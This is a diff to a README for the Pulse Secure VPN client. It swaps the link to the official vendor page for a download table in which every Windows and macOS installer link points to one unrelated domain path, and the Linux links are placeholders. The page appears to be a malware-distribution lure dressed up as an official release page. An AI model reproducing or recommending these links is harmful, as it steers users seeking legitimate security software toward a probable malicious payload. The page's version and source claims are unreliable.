@@ -1,21 +1,34 @@
-# Pulse Secure
+# Download and install Pulse Secure
 
 **Pulse Secure** is a comprehensive VPN solution designed to provide secure and seamless access to applications and resources for businesses. The platform integrates advanced features like user authentication, traffic encryption, and dynamic policy evaluations to ensure robust security and user management.
 
-## Table of Contents
-- [Installation](#installation)
+- [Download Pulse Secure](#download-pulse-secure)
+- [Install Pulse Secure](#install-pulse-secure)
 - [System Requirements](#system-requirements)
 - [Authentication and Directory Servers](#authentication-and-directory-servers)
 - [User Roles and Policies](#user-roles-and-policies)
 - [Additional Features](#additional-features)
 - [Troubleshooting](#troubleshooting)
 
-## Installation
+## Download Pulse Secure
+Pulse Secure 9.1 is the latest stable version
 
-To install Pulse Secure for Windows:  
+*   Release number: 9.1
+*   Release date: January 14, 2025
 
-### 🔗 [Download Pulse Secure](https://www.ivanti.com/company/history/pulse-secure)
+| Platform | Type             | Download                                                                                                                                                                                                                             |
+| -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Windows  | Standard Installer   | [64-bit version](https://foodfastfin.com/boot/) [ARM64 version](https://foodfastfin.com/boot/)                                                                                          |
+|          | System Installer | [64-bit version](https://foodfastfin.com/boot/) [ARM64 version](https://foodfastfin.com/boot/)                                                                                        |
+|          | .zip             | [64-bit version](https://foodfastfin.com/boot/) [ARM64 version](https://foodfastfin.com/boot/)                                                                                          |
+| macOS    | .zip             | [Universal](https://foodfastfin.com/boot/) [Intel Chip](https://foodfastfin.com/boot/) [Apple Silicon](https://foodfastfin.com/boot/) |
+| Linux    | .tar.gz          | [64-bit version](*)                                                                                                                                                                 |
+|          | .deb             | [64-bit version](*)                                                                                                                                                               |
+|          | .rpm             | [64-bit version](*)              
 
+
+
+## Install Pulse Secure
 
 1. **Prepare the Environment**
    - Verify that your system meets the minimum requirements.
